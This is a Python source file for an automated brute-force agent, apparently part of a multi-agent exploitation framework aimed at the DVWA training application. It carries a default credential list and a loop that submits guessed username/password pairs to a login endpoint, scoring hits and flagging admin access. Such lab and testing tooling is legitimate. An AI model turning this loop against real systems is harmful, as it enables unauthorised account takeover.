"""Tier 2 brute force credential agent."""

from __future__ import annotations

from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession


DEFAULT_CREDENTIALS: list[tuple[str, str]] = [
    ("admin", "password"),
    ("admin", "admin"),
    ("gordonb", "abc123"),
    ("pablo", "letmein"),
]


class BruteForceAgent(BaseAgent):
    module_name = "brute"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    def _candidates(self, level: str) -> list[tuple[str, str]]:
        payload_set = self.payloads.get(self.module_name, level)
        candidates = list(DEFAULT_CREDENTIALS)
        for payload in list(payload_set.probe) + list(payload_set.exploit):
            if ":" not in payload:
                continue
            user, password = payload.split(":", 1)
            pair = (user.strip(), password.strip())
            if pair not in candidates:
                candidates.append(pair)
        return candidates

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/brute/")
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        found_credentials: list[dict[str, str]] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            for username, password in self._candidates(level):
                probe = f"{username}:{password}"
                if probe in already_tried:
                    continue
                tried_now.append(probe)
                response = session.get(
                    endpoint,
                    params={
                        "username": username,
                        "password": password,
                        "Login": "Login",
                    },
                )
                body = (response.text or "").lower()

                if "username and/or password incorrect" not in body:
                    score = max(score, 1)

                if "welcome to the password protected area" in body:
                    score = 3
                    confirmed = ["brute_force_confirmed", "credentials_extracted"]
                    found_credentials = [{"username": username, "password": password}]
                    if username == "admin":
                        score = 4
                        confirmed.append("admin_session_obtained")
                    break
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "brute_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            found_credentials=found_credentials,
        )


_AGENT = BruteForceAgent()


def brute_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
